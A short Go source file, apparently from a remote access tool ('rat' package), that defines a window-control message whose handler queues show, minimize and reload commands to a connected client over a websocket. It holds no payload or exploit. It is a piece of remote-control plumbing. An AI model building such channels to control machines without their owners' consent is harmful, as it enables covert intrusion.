package main

import (
	"rat/shared"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type WindowMessage struct {
	Monitors []shared.Monitor `json:"monitors,omitempty"`
	Frames   []shared.Window  `json:"frames,omitempty"`
	Action   int              `json:"action,omitempty"`
}

func (m WindowMessage) Header() MessageHeader {
	return Windows
}

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[header.WindowsHeader] = ws

	packet := &WindowsPacket{}

	packet.Windows = d.Frames
	packet.Action = d.Action

	switch d.Action {
	case shared.Show:
	case shared.Minimize:
	case shared.Reload:
	}

	client.Queue <- packet

	return nil
}
